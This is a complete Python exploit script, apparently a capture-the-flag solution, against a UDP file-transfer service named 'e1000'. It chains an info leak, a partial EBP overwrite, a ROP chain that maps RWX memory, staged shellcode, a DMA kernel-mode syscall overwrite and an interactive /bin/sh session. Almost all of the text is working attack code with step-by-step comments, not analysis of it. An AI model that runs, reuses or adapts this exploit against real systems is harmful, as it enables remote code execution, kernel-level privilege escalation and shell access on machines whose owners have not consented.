#!/usr/bin/env python

import socket, random, time, threading, sys, os, tempfile
from sys import argv,exit
from struct import pack, unpack

DEFAULT_PORT = 4444
DEBUG = False
global done
done = False

# the kernel-mode syscall we will overwrite the code for
kern_sys_times = 0xc103f4a1
kern_target = kern_sys_times & 0x0fffffff

# where we will load our initial shellcode
stager_base = 0x6e777000

# figure out the lengths for the PUT and GET requests to get the desired EBP overwrite
# -- maximize the PUT-length (plength) so that we have as much space as possible
#    in the GET request to store our ROP chain and shellcode
stack_offset = 0
tlength=1922
plength=1440-stack_offset
plength = ((plength + 0xf) & 0xfffffff0) | 2
glength=tlength-plength+2*(plength-1378)


# socket wrapper functions
def connect(dst, port):
  try:
    s = socket.socket(socket.AF_INET6 if ':' in dst else socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((dst, port))
    s.settimeout(5)
    return s
  except socket.error, e:
    print "[-] Error: %s" % repr(e)
    exit(1)
 
def recv(s, size=4096):
  d = s.recv(size)
  if DEBUG: print "S: %r" % d
  return d
 
def send(s, d, plen=1500-14-20):
  if DEBUG: print "C: %r" % d
  a = s.send(d)
  time.sleep(0.05)
  return a

def close(s):
  s.close()

# perform text-based substitutions for addresses we calculate at runtime
#  and assemble the shellcode to byte-code by calling out to nasm
def assemble(file, resolutions = {}):
  f = open(file, 'r')
  asm = f.read()
  f.close()

  for key in resolutions.keys():
    asm = asm.replace("${" + key + "}", resolutions[key])
  
  f = tempfile.NamedTemporaryFile(delete=False)
  f.write(asm)
  tn = f.name
  f.close()
  os.system('nasm -o %s.out %s 2>&1 | grep -v "uninitialized space"' % (tn,tn))

  try:
    f = open(tn + '.out', 'rb')
    shellcode = f.read().rstrip("\x00")
    f.close()
  except:
    print "[-] Failed to assemble:", file
    exit(1)

  os.unlink(tn)
  os.unlink(tn + '.out')

  print "[+] Assembled:", file, "Length:", len(shellcode)

  return shellcode

# win
def exploit(dst, port):
  global done

  mode = "netascii"

  stackaddr = 0
  baseaddr = 0

  s = connect(dst, port)

  while True:
    # do the infoleak by sending the GET request with a 28-character filename that isn't NULL-terminated and has no mode string
    getCmd = pack(">H", 1) + "A"*28
    send(s, getCmd)

    try:
      getRes = recv(s)
      # stack will always have 0xbf as the high-order byte
      if getRes.find("\xbf") != -1:
        stackaddr, otheraddr = unpack("<II", getRes.replace("\x00\x05\x00\x01File not found (" + "A"*28, "").replace(")\x00","")[:-1])
        # calculate the load address for e1000
        baseaddr = otheraddr - 0x1504
        # we can exploit 6 out of the 16 paragraph alignments from ASLR
        sp = (stackaddr >> 4) & 0xf
        if sp >= 8 and sp <= 0xd:
          print "[+] Info-Leak successful, Stack Address:", hex(stackaddr), " e1000 Base:", hex(baseaddr)
          break

        print "[-] Info-Leak successful, but stack alignment is not exploitable, crashing service to retry"
        # Overwrite part of EBP to crash almost immediately
        send(s, pack(">H", 1) + "A"*(539-17))
        time.sleep(2)
      else:
        print "[-] Unexpected response to infoleak: " + repr(getRes)
      
    except socket.error, e:
      print "[-] Info-Leak: No Response"

  #calculate gadget addresses
  mmap_fn = baseaddr + 0xdc4
  memcpy_chk_fn = baseaddr + 0xe84
  pop4ret_fn = baseaddr + 0x11bc
  pop6ret_fn = baseaddr + 0x38e8
  setebp_fn = baseaddr + 0x1083
  nop_fn = baseaddr + 0x1084
  #0x00001772: lea esp, dword [ebp-0x08] ; pop esi ; pop edi ; pop ebp ; ret  ;  (3 found)
  setesp_fn = baseaddr + 0x1772

  resolutions = { 
    "kernel_target": hex(kern_target-20-14-8),
    "setup_device_handler": hex(baseaddr+0x2DD8),
    "check_recv_pkt": hex(baseaddr+0x1708),
    "recvLoop": hex(baseaddr+0x10f5), 
    "sendPkt": hex(baseaddr+0x2bbb),
  }

  # assemble our shellcodes
  stager = assemble('shellcode/stager.asm', resolutions)
  privx = assemble('shellcode/dma_overwrite.asm', resolutions)
  shellcode = assemble('shellcode/shell.asm', resolutions)
  kern_shellcode = assemble('shellcode/kernel.asm', resolutions)

  #build payload
  rop = ""
  #i'm lazy because maths
  rop += pack("<I", nop_fn)*25
  # mmap in some RWX space at a fixed location
  rop += pack("<IIIIIIII", mmap_fn, pop6ret_fn, stager_base, 0x100000, 0x7, 0x32, 0xffffffff, 0)
  # copy the stager shellcode to the RWX space and then return into it
  rop += pack("<IIIIII", memcpy_chk_fn, stager_base, stager_base, stackaddr - 560 + stack_offset, len(stager), len(stager))
  rop += stager
  # make sure payload is 4-byte aligned
  rop += "\xcc"*(4 - (len(rop) & 0x3))
  # jamaica we have a ropsled team
  rop += pack("<I", nop_fn)*((glength - len(rop) - 12)/4)
  # set ESP to point into the first ROP-sled
  rop += pack("<II", setebp_fn, stackaddr-700)
  rop += pack("<I", setesp_fn)

  # setup the stack for the exploit by starting with a PUT request for a new file
  # pack a random int in there to prevent filename collisions (the file should not exist for this to work)
  putCmd = pack(">H", 2) + pack("<I", random.randint(0,0xffffffff)) + "A"*(plength-4) + "\x00" + mode + "\x00"
  send(s, putCmd)

  putRes = recv(s)
  # make sure we got an ACK response
  if putRes[1] != "\x04":
    print '[-] Invalid result from PUT command (file already exists?)'
    # Overwrite part of EBP to crash almost immediately
    send(s, pack(">H", 1) + "A"*(539-17))
    exit(1)
  else:
    print '[+] PUT command accepted'

  # fire in the hole!
  # send a GET request to do the partial EBP overwrite and land in our ROP-sled
  getCmd = pack(">H", 1) + rop
  send(s, getCmd)

  # check for a response from the stager indicating we got execution
  rsp = recv(s)

  if rsp != 'FEED':
    print '[-] Invalid response from shellcode stager'
    exit(1)
  else:
    print '[+] Stager handshake confirmed, sending payloads'

  # send the individual payloads to the stager
  send(s, pack("<III", 0xc0dec0de, len(privx), 0) + privx)
  print '[+] Sent DMA kernel-mode overwrite payload'
  time.sleep(0.1)
  send(s, pack("<III", 0xc0dec0de, len(shellcode), 0x4000) + shellcode)
  print '[+] Sent execve(/bin/sh) payload'
  time.sleep(0.1)
  # tell the stager to run the stages (in the order we sent them)
  send(s, pack("<I", 0xdec0ded))
  print '[+] Sent stager activation code'

  time.sleep(0.5)

  # send the kernel shellcode to overwrite the syscall
  send(s, kern_shellcode)
  print '[+] Sent kernel-mode syscall overwrite, delaying 2 seconds...'

  # delay to let the recv loop finish and reset the DMA addresses
  time.sleep(2)

  # by now, the shell should be running, waiting for our input
  print '[+] Sending "id"'
  send(s, "id\n")

  # enter a send/receive loop on the socket to interact with the shell
  def recv_thread():
    global done
    while done == False:
      try:
        l = recv(s)
        sys.stdout.write(l)
      except socket.error:
        errno, errstr = sys.exc_info()[:2]
        if errno != socket.timeout:
          print "socket error: " + errstr
          done = True
          sys.exit()

  rt = threading.Thread(target=recv_thread)
  rt.start()

  try:
    while done == False:
      send(s, sys.stdin.readline())
  except KeyboardInterrupt:
    # since this is a UDP connection, send some exit command to try to terminate the shell
    #  - otherwise the e1000 program won't exit and be restarted
    send(s, "exit\n")
    send(s, "exit\n")
    send(s, "exit\n")
    print "Interrupted"
  done = True
  s.close()
  if rt.isAlive():
        try:
            rt._Thread__stop()
        except:
            print('Receive Thread could not be terminated')


if __name__=='__main__':
  if len(argv) < 2:
    print "Usage: %s <dst> [<port=%i>]" % (argv[0], DEFAULT_PORT)
    exit(1)
  dst = argv[1]
  port = int(argv[2]) if len(argv)>2 else DEFAULT_PORT
  exploit(dst, port)
  exit(0)
